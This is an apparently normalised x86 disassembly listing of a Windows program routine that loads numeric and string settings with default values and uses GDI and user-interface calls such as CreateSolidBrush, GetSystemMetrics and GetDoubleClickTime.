push 0x0
push r--data
lea eax [ esp + 0x120 ]
push eax
lea ecx [ esp + 0x530 ]
call sub_435100
mov edx [ esp + edi * 4 + 0x20 ]
push ebx
lea ecx [ esi + 0x8 ]
push ecx
push edx
push r--data
lea eax [ esp + 0x120 ]
push eax
lea ecx [ esp + 0x530 ]
call sub_435100
push ebx
push 0x104
lea ecx [ esi + 0xc ]
push ecx
push r--data
push r--data
lea edx [ esp + 0x124 ]
push edx
lea ecx [ esp + 0x534 ]
call sub_435230
add esi 0x12c
cmp esi rw-data
mov edi ebp
jl r-xdata
push ebx
push rw-data
push 0x4
push r--data
push r--data
lea ecx [ esp + 0x530 ]
call sub_435100
push ebx
push rw-data
push 0x2
push r--data
push r--data
lea ecx [ esp + 0x530 ]
call sub_435100
push ebx
push rw-data
push 0x1
push r--data
push r--data
lea ecx [ esp + 0x530 ]
call sub_435100
push ebx
push rw-data
xor edi edi
push edi
push r--data
push r--data
lea ecx [ esp + 0x530 ]
call sub_435100
push ebx
push rw-data
push edi
push r--data
push r--data
lea ecx [ esp + 0x530 ]
call sub_435100
push ebx
push rw-data
push edi
push r--data
push r--data
lea ecx [ esp + 0x530 ]
call sub_435100
push ebx
push rw-data
push 0x808080
push r--data
push r--data
lea ecx [ esp + 0x530 ]
call sub_435100
push ebx
push 0x104
push rw-data
push r--data
push r--data
push r--data
lea ecx [ esp + 0x534 ]
call sub_435230
push ebx
push rw-data
push edi
push r--data
push r--data
lea ecx [ esp + 0x530 ]
call sub_435100
mov eax [ rw-data ]
cmp eax edi
mov ebp [ DeleteObject@IAT ]
je r-xdata
push ebx
push rw-data
mov edi 0x1
push edi
push r--data
push r--data
lea ecx [ esp + 0x530 ]
call sub_435100
push ebx
push rw-data
push 0x5
push r--data
push r--data
lea ecx [ esp + 0x530 ]
call sub_435100
push ebx
push rw-data
push 0x1e
push r--data
push r--data
lea ecx [ esp + 0x530 ]
call sub_435100
push ebx
push rw-data
push 0x4
push r--data
push r--data
lea ecx [ esp + 0x530 ]
call sub_435100
push ebx
push rw-data
push esi
push r--data
push r--data
lea ecx [ esp + 0x530 ]
call sub_435100
push ebx
push rw-data
push edi
push r--data
push r--data
lea ecx [ esp + 0x530 ]
call sub_435100
push ebx
push rw-data
push 0x4
push r--data
push r--data
lea ecx [ esp + 0x530 ]
call sub_435100
push ebx
push rw-data
push esi
push r--data
push r--data
lea ecx [ esp + 0x530 ]
call sub_435100
push ebx
push rw-data
push 0x64
push r--data
push r--data
lea ecx [ esp + 0x530 ]
call sub_435100
push ebx
push rw-data
push 0x64
push r--data
push r--data
lea ecx [ esp + 0x530 ]
call sub_435100
push ebx
push rw-data
push 0x19
push r--data
push r--data
lea ecx [ esp + 0x530 ]
call sub_435100
push ebx
push rw-data
push 0x19
push r--data
push r--data
lea ecx [ esp + 0x530 ]
call sub_435100
push ebx
push rw-data
push esi
push r--data
push r--data
lea ecx [ esp + 0x530 ]
call sub_435100
push ebx
push rw-data
push 0xc350
push r--data
push r--data
lea ecx [ esp + 0x530 ]
call sub_435100
push ebx
push rw-data
push esi
push r--data
push r--data
lea ecx [ esp + 0x530 ]
call sub_435100
push ebx
push rw-data
push esi
push r--data
push r--data
lea ecx [ esp + 0x530 ]
call sub_435100
mov eax 0x40
mov ecx 0x30
mov edx 0x80
mov [ esp + 0x54 ] edi
mov [ esp + 0x58 ] esi
mov [ esp + 0x5c ] edi
mov [ esp + 0x60 ] esi
mov [ esp + 0x64 ] esi
mov [ esp + 0x40 ] esi
mov [ esp + 0x44 ] esi
mov [ esp + 0x48 ] esi
mov [ esp + 0x4c ] esi
mov [ esp + 0x50 ] esi
mov [ esp + 0xdc ] esi
mov [ esp + 0xe0 ] esi
mov [ esp + 0xe8 ] esi
mov [ esp + 0xec ] esi
mov [ esp + 0xf0 ] esi
mov [ esp + 0xf4 ] esi
mov [ esp + 0x20 ] esi
mov [ esp + 0x24 ] esi
mov [ esp + 0x28 ] edi
mov [ esp + 0x30 ] esi
mov [ esp + 0xd4 ] 0x8
mov [ esp + 0xd8 ] 0x10
mov [ esp + 0xe4 ] 0x14
mov [ esp + 0xfc ] ecx
mov [ esp + 0x100 ] eax
mov [ esp + 0x104 ] eax
mov [ esp + 0x108 ] edx
mov [ esp + 0x10c ] 0x2a
mov [ esp + 0xc0 ] ecx
mov [ esp + 0xc4 ] 0x60
mov [ esp + 0xc8 ] eax
mov [ esp + 0xcc ] edx
mov [ esp + 0xd0 ] 0xfa
mov [ esp + 0xf8 ] 0x23
mov [ esp + 0x2c ] 0x2
xor edi edi
mov esi rw-data
lea ecx [ ecx ]
mov eax [ rw-data ]
cmp eax esi
je r-xdata
mov eax [ rw-data ]
sub eax edi
sar eax 0x2
cmp eax esi
jne r-xdata
mov ebp [ rw-data ]
mov ecx [ ebp + ecx * 4 ]
mov ecx [ ecx + edx * 4 ]
mov edx [ rw-data ]
imul ecx ecx 0x70
add ecx edx
mov edx [ ecx + 0x20 ]
sub [ rw-data ] edx
lea ecx [ eax * 4 ]
sub edi ecx
mov ecx [ rw-data ]
cmp ecx eax
ja r-xdata
sub ecx ebp
mov eax [ rw-data ]
mov esi [ CreateSolidBrush@IAT ]
push eax
call esi
mov [ rw-data ] eax
cmp [ rw-data ] 0x1
jne r-xdata
push eax
call ebp
cmp ebp esi
mov ecx [ rw-data ]
sub ecx eax
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x6
mov eax edx
shr eax 0x1f
add edx eax
mov [ esp + 0x10 ] edx
je r-xdata
mov edx [ ebp + eax * 4 ]
mov eax [ edx + edi * 4 ]
mov ecx [ rw-data ]
mov edx [ ecx + eax * 4 ]
push edx
call [ LocalFree@IAT ]
mov ecx [ rw-data ]
mov eax ecx
cdq
and edx 0x3
add eax edx
sar eax 0x2
lea edx [ eax * 4 ]
sub ecx edx
mov edx [ rw-data ]
cmp edx eax
ja r-xdata
sub eax ecx
push ebx
push rw-data
push edi
push r--data
push r--data
lea ecx [ esp + 0x530 ]
call sub_435100
push ebx
push rw-data
push 0x808080
push r--data
push r--data
lea ecx [ esp + 0x530 ]
call sub_435100
push ebx
push 0x104
push rw-data
push r--data
push r--data
push r--data
lea ecx [ esp + 0x534 ]
call sub_435230
push ebx
push rw-data
push edi
push r--data
push r--data
lea ecx [ esp + 0x530 ]
call sub_435100
mov eax [ rw-data ]
cmp eax edi
je r-xdata
push edi
push edi
push edi
push edi
push rw-data
call sub_439280
add esp 0x4
push eax
push rw-data
call sub_458050
add esp 0x4
push eax
push edi
mov ecx rw-data
call sub_4411b0
cmp edi esi
je r-xdata
cmp ebp esi
jbe r-xdata
mov edx [ rw-data ]
mov eax [ edx + eax * 4 ]
mov ecx [ eax + ecx * 4 ]
mov edx [ rw-data ]
mov [ edx + ecx * 4 ] esi
cmp [ rw-data ] esi
mov edi [ rw-data ]
je r-xdata
sub eax edx
mov ecx [ rw-data ]
push ecx
call esi
push ebx
push rw-data
push edi
push r--data
push r--data
lea ecx [ esp + 0x530 ]
mov [ rw-data ] eax
call sub_4351e0
push ebx
push rw-data
push edi
push r--data
push r--data
lea ecx [ esp + 0x530 ]
call sub_435100
push ebx
push rw-data
push 0xc8
push r--data
push r--data
lea ecx [ esp + 0x530 ]
call sub_435100
push ebx
push rw-data
push 0xc8
push r--data
push r--data
lea ecx [ esp + 0x530 ]
call sub_435100
push ebx
push 0x104
push rw-data
push r--data
push r--data
push r--data
lea ecx [ esp + 0x534 ]
call sub_435230
push ebx
push rw-data
push 0xc8
push r--data
push r--data
lea ecx [ esp + 0x530 ]
call sub_435100
push ebx
push rw-data
push 0x3c
push r--data
push r--data
lea ecx [ esp + 0x530 ]
call sub_435100
push ebx
push rw-data
push 0x50
push r--data
push r--data
lea ecx [ esp + 0x530 ]
call sub_435100
push ebx
push rw-data
push 0x64
push r--data
push r--data
lea ecx [ esp + 0x530 ]
call sub_435100
push ebx
push rw-data
push edi
push r--data
push r--data
lea ecx [ esp + 0x530 ]
call sub_435100
push ebx
push rw-data
push 0x1
push r--data
push r--data
lea ecx [ esp + 0x530 ]
call sub_435100
push ebx
push rw-data
push edi
push r--data
push r--data
lea ecx [ esp + 0x530 ]
call sub_435100
push ebx
push rw-data
push 0xc8
push r--data
push r--data
lea ecx [ esp + 0x530 ]
call sub_435100
push ebx
push rw-data
push 0x3e8
push r--data
push r--data
lea ecx [ esp + 0x530 ]
call sub_435100
push ebx
push rw-data
push 0x1
push r--data
push r--data
lea ecx [ esp + 0x530 ]
call sub_435100
push ebx
push rw-data
push edi
push r--data
push r--data
lea ecx [ esp + 0x530 ]
call sub_435100
mov [ esp + 0x40 ] r--data
mov [ esp + 0x44 ] r--data
mov [ esp + 0x48 ] r--data
mov [ esp + 0x4c ] r--data
mov [ esp + 0x10 ] edi
mov [ esp + 0x14 ] edi
lea esp [ esp ]
push eax
call ebp
mov ecx rw-data
mov [ rw-data ] esi
mov [ rw-data ] esi
mov [ rw-data ] esi
call sub_460310
mov [ rw-data ] esi
push edi
call j_sub_4b66ed#2
add esp 0x4
jne r-xdata
mov ecx rw-data
call sub_4010f0
push esi
push eax
mov ecx rw-data
call sub_42c920
mov ecx rw-data
call sub_4010f0
mov edi [ rw-data ]
mov ecx eax
shl ecx 0x2
mov edx ecx
shr ecx 0x2
xor eax eax
[ edi ]
mov ecx edx
and ecx 0x3
[ edi ]
mov ebp [ rw-data ]
mov edi [ rw-data ]
mov ebp [ rw-data ]
cmp [ rw-data ] ebp
ja r-xdata
mov eax [ rw-data ]
inc edi
lea ecx [ eax * 4 ]
cmp ecx edi
mov [ rw-data ] edi
ja r-xdata
mov ebp [ esp + 0x14 ]
mov eax [ ebp + rw-data ]
test eax eax
lea ebp [ ebp + rw-data ]
jge r-xdata
mov [ esp + 0x18 ] 0x1c
jmp r-xdata
mov eax edi
cdq
and edx 0x3
add eax edx
sar eax 0x2
mov ecx eax
lea edx [ ecx * 4 ]
mov ebp edx
mov edx edi
sub edx ebp
mov ebp [ rw-data ]
cmp ebp ecx
ja r-xdata
dec [ rw-data ]
jne r-xdata
xor edi edi
mov [ rw-data ] edi
mov esi [ edi + rw-data ]
test esi esi
jne r-xdata
mov [ ebp ] 0x0
mov eax [ edi + rw-data ]
test eax eax
jne r-xdata
xor edi edi
mov [ rw-data ] edi
mov ecx [ edi + rw-data ]
sub ecx esi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov ecx edx
shr ecx 0x1f
add edx ecx
xor edx edx
jmp r-xdata
mov ecx [ edi + rw-data ]
sub ecx eax
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov ecx edx
shr ecx 0x1f
add edx ecx
xor edx edx
jmp r-xdata
mov ecx [ esp + 0x14 ]
add edi 0x10
add ecx 0x4
cmp edi 0x40
mov [ esp + 0x10 ] edi
mov [ esp + 0x14 ] ecx
jl r-xdata
test esi esi
jne r-xdata
cmp [ ebp ] edx
jle r-xdata
lea eax [ esp + 0x210 ]
mov [ esp + 0x38 ] 0xf
mov [ esp + 0x34 ] 0x0
mov [ esp + 0x24 ] 0x0
lea edx [ eax + 0x1 ]
nop
mov ecx [ esp + 0x10 ]
mov eax [ ecx + rw-data ]
mov edx [ esp + 0x18 ]
lea ecx [ eax + edx - 0x1c ]
lea eax [ esp + 0x210 ]
lea edi [ eax + 0x1 ]
lea esp [ esp ]
lea eax [ esi - 0x1 ]
cmp eax edx
jge r-xdata
mov esi [ esp + 0x14 ]
mov ebp [ esp + esi + 0x40 ]
push ebp
lea edx [ esp + 0x114 ]
push r--data
push edx
call [ wsprintfA@IAT ]
add esp 0xc
push ebx
lea eax [ esi + rw-data ]
push eax
push 0x0
lea eax [ esp + 0x11c ]
push eax
push r--data
lea ecx [ esp + 0x530 ]
call sub_435100
mov esi 0x1
push esi
push ebp
lea ecx [ esp + 0x118 ]
push r--data
push ecx
call [ wsprintfA@IAT ]
add esp 0x10
push ebx
push 0x104
lea edx [ esp + 0x218 ]
push edx
push r--data
lea eax [ esp + 0x120 ]
push eax
push r--data
lea ecx [ esp + 0x534 ]
call sub_435230
test eax eax
jne r-xdata
push ebx
push rw-data
push 0x1
push r--data
push r--data
lea ecx [ esp + 0x530 ]
call sub_435100
push ebx
push rw-data
push 0x0
push r--data
push r--data
lea ecx [ esp + 0x530 ]
call sub_435100
push ebx
push rw-data
push 0xc
push r--data
push r--data
lea ecx [ esp + 0x530 ]
call sub_435100
push ebx
push rw-data
push 0xa
push r--data
push r--data
lea ecx [ esp + 0x530 ]
call sub_435100
mov ecx [ rw-data ]
mov edx [ rw-data ]
add edx ecx
xor esi esi
test edx edx
jle r-xdata
mov ecx [ edi + rw-data ]
sub ecx esi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add edx eax
xor edx edx
jmp r-xdata
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
push eax
lea ecx [ esp + 0x214 ]
push ecx
lea ecx [ esp + 0x28 ]
call sub_401e80
lea edx [ esp + 0x20 ]
push edx
lea ecx [ edi + rw-data ]
mov [ esp + 0x10534 ] 0x1
call sub_407460
cmp [ esp + 0x38 ] 0x10
mov [ esp + 0x10530 ] 0x0
jb r-xdata
mov dl [ eax ]
inc eax
test dl dl
jne r-xdata
sub eax edi
push eax
lea eax [ esp + 0x214 ]
push eax
call sub_401e80
mov edi [ esp + 0x10 ]
jmp r-xdata
push ebx
push rw-data
push 0x0
push r--data
push r--data
lea ecx [ esp + 0x530 ]
call sub_4351e0
push ebx
push rw-data
push 0x0
push r--data
push r--data
lea ecx [ esp + 0x530 ]
call sub_435100
push ebx
push rw-data
push 0x0
push r--data
push r--data
lea ecx [ esp + 0x530 ]
call sub_435100
push ebx
push rw-data
push 0x0
push r--data
push r--data
lea ecx [ esp + 0x530 ]
call sub_435100
push ebx
push rw-data
push 0x0
push r--data
push r--data
lea ecx [ esp + 0x530 ]
call sub_435100
push ebx
push rw-data
push 0x0
push r--data
push r--data
lea ecx [ esp + 0x530 ]
call sub_435100
push ebx
push rw-data
push 0xca
push r--data
push r--data
lea ecx [ esp + 0x530 ]
call sub_435100
test eax eax
jne r-xdata
lea edi [ esi + 0x1 ]
push edi
lea eax [ esp + 0x114 ]
push r--data
push eax
call [ wsprintfA@IAT ]
mov ecx [ esi * 4 + rw-data ]
add esp 0xc
push ebx
lea ebp [ esi * 4 + rw-data ]
push ebp
dec ecx
push ecx
lea edx [ esp + 0x11c ]
push edx
push r--data
lea ecx [ esp + 0x530 ]
call sub_435100
test eax eax
jne r-xdata
dec edx
mov [ ebp ] edx
mov [ esp + 0x38 ] 0xf
mov [ esp + 0x34 ] 0x0
mov [ esp + 0x24 ] 0x0
mov eax [ esp + 0x24 ]
push eax
call j_sub_4b66ed#2
add esp 0x4
mov eax [ esp + 0x18 ]
inc esi
push esi
push ebp
lea ecx [ esp + 0x118 ]
add eax 0x1c
push r--data
push ecx
mov [ esp + 0x28 ] eax
call [ wsprintfA@IAT ]
add esp 0x10
push ebx
push 0x104
lea edx [ esp + 0x218 ]
push edx
push r--data
lea eax [ esp + 0x120 ]
push eax
push r--data
lea ecx [ esp + 0x534 ]
call sub_435230
test eax eax
je r-xdata
push ebx
push rw-data
push 0x0
push r--data
push r--data
lea ecx [ esp + 0x530 ]
call sub_435100
push ebx
push rw-data
push 0x0
push r--data
push r--data
lea ecx [ esp + 0x530 ]
call sub_435100
push ebx
push rw-data
push 0x32
push r--data
push r--data
lea ecx [ esp + 0x530 ]
call sub_435100
push ebx
push rw-data
push 0xfffffff6
push r--data
push r--data
lea ecx [ esp + 0x530 ]
call sub_435100
push ebx
push rw-data
push 0x0
push r--data
push r--data
lea ecx [ esp + 0x530 ]
call sub_435100
push ebx
push rw-data
push 0xc8
push r--data
push r--data
lea ecx [ esp + 0x530 ]
call sub_435100
push ebx
push rw-data
push 0x0
push r--data
push r--data
lea ecx [ esp + 0x530 ]
call sub_435100
push ebx
push rw-data
push 0x0
push r--data
push r--data
lea ecx [ esp + 0x530 ]
call sub_435100
push ebx
push rw-data
push 0x0
push r--data
push r--data
lea ecx [ esp + 0x530 ]
call sub_435100
push ebx
push rw-data
push 0x0
push r--data
push r--data
lea ecx [ esp + 0x530 ]
call sub_435100
push ebx
push rw-data
push 0x0
push r--data
push r--data
lea ecx [ esp + 0x530 ]
call sub_435100
push ebx
push rw-data
push 0x0
push r--data
push r--data
lea ecx [ esp + 0x530 ]
call sub_435100
push ebx
push rw-data
push 0x1
push r--data
push r--data
lea ecx [ esp + 0x530 ]
call sub_435100
push ebx
push rw-data
push 0x1
push r--data
push r--data
lea ecx [ esp + 0x530 ]
call sub_435100
push ebx
push rw-data
push 0x0
push r--data
push r--data
lea ecx [ esp + 0x530 ]
call sub_435100
push ebx
push rw-data
push 0x1
push r--data
push r--data
lea ecx [ esp + 0x530 ]
call sub_435100
push ebx
push rw-data
push 0x0
push r--data
push r--data
lea ecx [ esp + 0x530 ]
call sub_435100
push ebx
push rw-data
push 0x0
push r--data
push r--data
lea ecx [ esp + 0x530 ]
call sub_4352b0
push ebx
push rw-data
push 0x0
push r--data
push r--data
lea ecx [ esp + 0x530 ]
call sub_4352b0
call sub_42c380
push ebx
push rw-data
push r--data
push r--data
push r--data
lea ecx [ esp + 0x530 ]
call sub_435780
push ebx
push rw-data
push 0x0
push r--data
push r--data
lea ecx [ esp + 0x530 ]
call sub_435100
push ebx
push rw-data
push 0x0
push r--data
push r--data
lea ecx [ esp + 0x530 ]
call sub_435100
push ebx
push rw-data
push 0x0
push r--data
push r--data
lea ecx [ esp + 0x530 ]
call sub_435100
push ebx
push rw-data
push 0x0
push r--data
push r--data
lea ecx [ esp + 0x530 ]
call sub_435100
push ebx
push rw-data
push 0x0
push r--data
push r--data
lea ecx [ esp + 0x530 ]
call sub_435100
push ebx
push rw-data
push 0x0
push r--data
push r--data
lea ecx [ esp + 0x530 ]
call sub_435100
mov [ esp + 0x80 ] 0xf
mov [ esp + 0x7c ] 0x0
mov [ esp + 0x6c ] 0x0
push ebx
lea edx [ esp + 0x6c ]
push edx
push r--data
push r--data
push r--data
lea ecx [ esp + 0x530 ]
mov [ esp + 0x10544 ] 0x2
call sub_435780
mov eax [ esp + 0x80 ]
mov esi 0x10
cmp eax esi
mov eax [ esp + 0x6c ]
jae r-xdata
test bl bl
je r-xdata
mov eax [ rw-data ]
mov ecx [ rw-data ]
mov esi edi
add ecx eax
cmp esi ecx
jl r-xdata
dec [ ebp ]
cmp esi 0x1
jle r-xdata
push eax
call sub_42c1d0
add esp 0x4
push ebx
mov [ rw-data ] eax
lea eax [ esp + 0x6c ]
push eax
push r--data
push r--data
push r--data
lea ecx [ esp + 0x530 ]
mov [ rw-data ] edx
call sub_435780
cmp [ esp + 0x80 ] esi
mov eax [ esp + 0x6c ]
jae r-xdata
lea eax [ esp + 0x6c ]
add [ rw-data ] 0x2
sub esp 0x1c
mov eax esp
dec esi
mov [ esp + 0x2c ] esp
mov [ eax + 0x18 ] 0xf
mov [ eax + 0x14 ] 0x0
push esi
lea ecx [ edi + rw-data ]
mov [ eax + 0x4 ] 0x0
call sub_421e10
push eax
call sub_42c1d0
add esp 0x4
push ebx
push rw-data
push 0x0
push r--data
push r--data
lea ecx [ esp + 0x530 ]
mov [ rw-data ] eax
mov [ rw-data ] edx
call sub_435100
xor esi esi
lea ecx [ ecx ]
lea eax [ esp + 0x6c ]
lea edi [ esi + 0x1 ]
push edi
lea ecx [ esp + 0x114 ]
push r--data
push ecx
call [ wsprintfA@IAT ]
mov eax [ esi * 4 + rw-data ]
add esp 0xc
push ebx
lea edx [ esi * 4 + rw-data ]
push edx
push eax
lea ecx [ esp + 0x11c ]
push ecx
push r--data
lea ecx [ esp + 0x530 ]
call sub_435100
mov esi edi
cmp esi 0xab
jb r-xdata
xor esi esi
lea edi [ eax + 0x1 ]
push edi
push ebp
lea edx [ esp + 0x118 ]
push r--data
push edx
call [ wsprintfA@IAT ]
mov ecx [ esi + rw-data ]
add esp 0x10
push ebx
lea eax [ esi + rw-data ]
push eax
push ecx
lea edx [ esp + 0x11c ]
push edx
push r--data
lea ecx [ esp + 0x530 ]
call sub_435100
mov eax edi
add esi 0x4
cmp eax 0x8
jl r-xdata
mov esi ebp
cmp esi 0x7
jl r-xdata
xor eax eax
lea ebp [ esi + 0x1 ]
shl esi 0x5
push ebx
push rw-data
push 0xc8
push r--data
push r--data
lea ecx [ esp + 0x530 ]
call sub_435100
test eax eax
je r-xdata
push ebx
push rw-data
push 0x0
push r--data
push r--data
lea ecx [ esp + 0x530 ]
call sub_435100
push ebx
push rw-data
push 0x4
push r--data
push r--data
lea ecx [ esp + 0x530 ]
call sub_435100
test eax eax
je r-xdata
call [ GetDoubleClickTime@IAT ]
mov [ rw-data ] eax
push ebx
push rw-data
push 0x3e8
push r--data
push r--data
lea ecx [ esp + 0x530 ]
call sub_435100
push ebx
push rw-data
push 0x1f4
push r--data
push r--data
lea ecx [ esp + 0x530 ]
call sub_435100
mov ebp [ wsprintfA@IAT ]
mov edi 0x1
push edi
lea eax [ esp + 0x114 ]
push r--data
push eax
call ebp
add esp 0xc
push ebx
lea ecx [ esp + 0x18 ]
push ecx
push 0x0
lea edx [ esp + 0x11c ]
push edx
push r--data
lea ecx [ esp + 0x530 ]
call sub_435100
test eax eax
jne r-xdata
push 0x44
call [ GetSystemMetrics@IAT ]
mov [ rw-data ] eax
mov eax [ rw-data ]
mov esi [ rw-data ]
mov esi [ rw-data ]
test esi esi
mov edx [ rw-data ]
jne r-xdata
push ebx
push rw-data
push 0x0
push r--data
push r--data
lea ecx [ esp + 0x530 ]
call sub_435100
push ebx
push rw-data
push 0x1e
push r--data
push r--data
lea ecx [ esp + 0x530 ]
call sub_435100
push ebx
push rw-data
push 0xc8
push r--data
push r--data
lea ecx [ esp + 0x530 ]
call sub_435100
push ebx
push rw-data
push 0x3c
push r--data
push r--data
lea ecx [ esp + 0x530 ]
call sub_435100
push ebx
push rw-data
push 0x5a
push r--data
push r--data
lea ecx [ esp + 0x530 ]
call sub_435100
xor esi esi
mov [ esp + 0x18 ] esi
mov ebp [ esp + 0x1c ]
xor edi edi
jmp r-xdata
mov eax edx
sub eax esi
sar eax 0x2
xor eax eax
jmp r-xdata
push ebx
lea edx [ esp + 0x218 ]
push edx
push 0x1
push r--data
lea eax [ esp + 0x30 ]
push eax
lea ecx [ esp + 0x530 ]
call sub_435100
push ebx
lea ecx [ esp + 0x21c ]
push ecx
push 0x1
push r--data
lea edx [ esp + 0x30 ]
push edx
lea ecx [ esp + 0x530 ]
call sub_435100
push ebx
lea eax [ esp + 0x220 ]
push eax
push 0x2
push r--data
lea ecx [ esp + 0x30 ]
push ecx
lea ecx [ esp + 0x530 ]
call sub_435100
push ebx
lea edx [ esp + 0x224 ]
push edx
push 0x0
push r--data
lea eax [ esp + 0x30 ]
push eax
lea ecx [ esp + 0x530 ]
call sub_435100
push ebx
lea ecx [ esp + 0x228 ]
push ecx
push 0x1
push r--data
lea edx [ esp + 0x30 ]
push edx
lea ecx [ esp + 0x530 ]
call sub_435100
push ebx
lea eax [ esp + 0x22c ]
push eax
push 0x2
push r--data
lea ecx [ esp + 0x30 ]
push ecx
lea ecx [ esp + 0x530 ]
call sub_435100
xor esi esi
lea ebx [ ebx ]
test esi esi
jne r-xdata
test esi esi
mov ecx [ edi + rw-data ]
mov [ esp + 0x10 ] ecx
je r-xdata
test esi esi
je r-xdata
mov edx [ esp + 0x14 ]
mov [ esi + edi * 4 - 0x4 ] edx
jmp r-xdata
lea ecx [ edi - 0x1 ]
cmp ecx eax
jge r-xdata
lea edi [ esi + 0x1 ]
push edi
lea edx [ esp + 0x114 ]
push r--data
push edx
call ebp
mov ecx [ esi * 4 + r--data ]
add esp 0xc
push ebx
lea eax [ esp + esi * 4 + 0x230 ]
push eax
push ecx
lea edx [ esp + 0x11c ]
push edx
lea eax [ esp + 0x30 ]
push eax
lea ecx [ esp + 0x530 ]
call sub_435100
mov esi edi
cmp esi 0x30
jl r-xdata
mov esi [ rw-data ]
mov edi [ rw-data ]
mov eax [ esp + 0x210 ]
xor ebp ebp
mov [ esp + 0x10 ] esi
xor eax eax
mov ebp rw-data
lea ecx [ esp + 0x10 ]
push ecx
push 0x1
push ecx
mov ecx esp
mov [ ecx ] eax
mov ecx rw-data
call sub_469770
mov eax [ rw-data ]
mov edx [ rw-data ]
mov ecx eax
sub ecx esi
sub edx esi
sar ecx 0x2
sar edx 0x2
cmp ecx edx
jae r-xdata
lea eax [ esp + 0x14 ]
push eax
push 0x1
push ecx
mov eax esp
mov ecx rw-data
mov [ eax ] edx
call sub_469770
mov ecx [ rw-data ]
mov eax edx
sub eax esi
sub ecx esi
sar eax 0x2
sar ecx 0x2
cmp eax ecx
jae r-xdata
inc edi
push edi
lea ecx [ esp + 0x114 ]
push r--data
push ecx
call ebp
add esp 0xc
push ebx
lea edx [ esp + 0x18 ]
push edx
push 0x0
lea eax [ esp + 0x11c ]
push eax
push r--data
lea ecx [ esp + 0x530 ]
call sub_435100
test eax eax
je r-xdata
mov ecx edi
sub ecx esi
mov eax 0x94f2095
imul ecx
mov eax [ esp + 0x210 ]
sar edx 0x3
mov ecx edx
shr ecx 0x1f
add edx ecx
xor edx edx
jmp r-xdata
mov eax [ esp + 0x18 ]
add ebp 0x10
cmp ebp rw-data
jl r-xdata
mov eax [ ebp ]
xor esi esi
cmp eax esi
je r-xdata
mov esi [ rw-data ]
push ebp
push rw-data
lea edx [ esp + 0x18 ]
push edx
push 0x1
push eax
mov esi eax
call sub_420d80
lea eax [ esi + 0x4 ]
add esp 0x14
mov [ rw-data ] eax
jmp r-xdata
cmp edi 0x1
mov eax [ rw-data ]
mov esi [ rw-data ]
jle r-xdata
mov eax [ esp + 0x1c ]
push eax
push rw-data
lea ecx [ esp + 0x1c ]
push ecx
push 0x1
push edx
mov esi edx
call sub_420d80
add esp 0x14
add esi 0x4
mov [ rw-data ] esi
jmp r-xdata
test esi esi
jne r-xdata
test eax eax
jne r-xdata
cmp ebp edx
jge r-xdata
inc eax
push eax
mov [ esp + 0x1c ] eax
lea eax [ esp + 0x114 ]
push r--data
push eax
call [ wsprintfA@IAT ]
add esp 0xc
push ebx
push 0x100
lea ecx [ esp + 0x218 ]
push ecx
push r--data
lea edx [ esp + 0x120 ]
push edx
push r--data
lea ecx [ esp + 0x534 ]
call sub_435230
test eax eax
jne r-xdata
push ebx
push rw-data
push 0x1
push r--data
push r--data
lea ecx [ esp + 0x530 ]
call sub_435100
push ebx
push rw-data
xor edi edi
push edi
push r--data
push r--data
lea ecx [ esp + 0x530 ]
call sub_435100
push ebx
push rw-data
push edi
push r--data
push r--data
lea ecx [ esp + 0x530 ]
call sub_435100
push ebx
push rw-data
push edi
push r--data
push r--data
lea ecx [ esp + 0x530 ]
call sub_435100
push ebx
push rw-data
push edi
push r--data
push r--data
lea ecx [ esp + 0x530 ]
call sub_435100
push ebx
push rw-data
push 0x1
push r--data
push r--data
lea ecx [ esp + 0x530 ]
call sub_435100
push ebx
push rw-data
push 0x1
push r--data
push r--data
lea ecx [ esp + 0x530 ]
call sub_435100
cmp [ rw-data ] edi
jne r-xdata
mov al [ esp + 0x210 ]
xor ecx ecx
test al al
lea edi [ esp + 0x210 ]
mov [ ebp ] esi
mov [ ebp + 0x4 ] esi
mov [ ebp + 0x8 ] esi
mov [ esp + 0x10 ] edi
mov [ esp + 0x14 ] ecx
je r-xdata
push eax
call j_sub_4b66ed#2
add esp 0x4
add edi 0x4
cmp edi 0x18
jb r-xdata
jne r-xdata
test esi esi
mov edx [ esp + 0x1c ]
lea ecx [ edi - 0x1 ]
mov [ esp + 0x10 ] edx
jne r-xdata
sub edi esi
mov eax 0x94f2095
imul edi
sar edx 0x3
mov eax edx
shr eax 0x1f
add edx eax
xor edx edx
jmp r-xdata
mov edx [ esp + 0x10 ]
cmp eax [ edx ]
je r-xdata
cmp [ esp + 0x18 ] ebp
je r-xdata
push ebx
push rw-data
push edi
push r--data
push r--data
lea ecx [ esp + 0x530 ]
call sub_435100
push ebx
push 0x104
lea eax [ esp + 0x420 ]
push eax
push r--data
push r--data
push r--data
lea ecx [ esp + 0x534 ]
call sub_435230
push ebx
push 0x104
push rw-data
push r--data
push r--data
push r--data
lea ecx [ esp + 0x534 ]
call sub_435230
mov al [ rw-data ]
test al al
je r-xdata
mov [ rw-data ] 0x1
lea esi [ ebp - 0x4 ]
jmp r-xdata
mov edx eax
sub edx esi
sar edx 0x2
xor edx edx
jmp r-xdata
mov edx [ esp + 0x14 ]
mov edi ebp
imul edi edi 0xdc
add edi esi
mov ecx 0x37
lea esi [ esp + 0x210 ]
[ edi ] [ esi ]
mov [ esp + 0x18 ] edx
mov esi edx
jmp r-xdata
lea ecx [ esp + 0x210 ]
push ecx
mov ecx rw-data
call sub_46ba00
mov edx [ esp + 0x14 ]
mov [ esp + 0x18 ] edx
mov esi edx
jmp r-xdata
cmp ebp edx
jne r-xdata
mov ecx edx
inc ebp
add ecx 0xdc
mov [ esp + 0x10 ] ecx
jmp r-xdata
lea eax [ esp + 0x418 ]
lea edx [ eax + 0x1 ]
jmp r-xdata
mov eax rw-data
lea edx [ eax + 0x1 ]
lea ecx [ ecx ]
cmp al 0x2c
jne r-xdata
cmp al 0x39
jg r-xdata
test bl bl
je r-xdata
test esi esi
je r-xdata
test esi esi
jne r-xdata
cmp edx ecx
jae r-xdata
mov ebp [ wsprintfA@IAT ]
lea eax [ esi + 0x1 ]
push eax
lea edx [ esp + 0x24 ]
push r--data
push edx
mov [ esp + 0x20 ] eax
call ebp
add esp 0xc
push ebx
lea eax [ esp + 0x214 ]
push eax
push 0x0
push r--data
lea ecx [ esp + 0x30 ]
push ecx
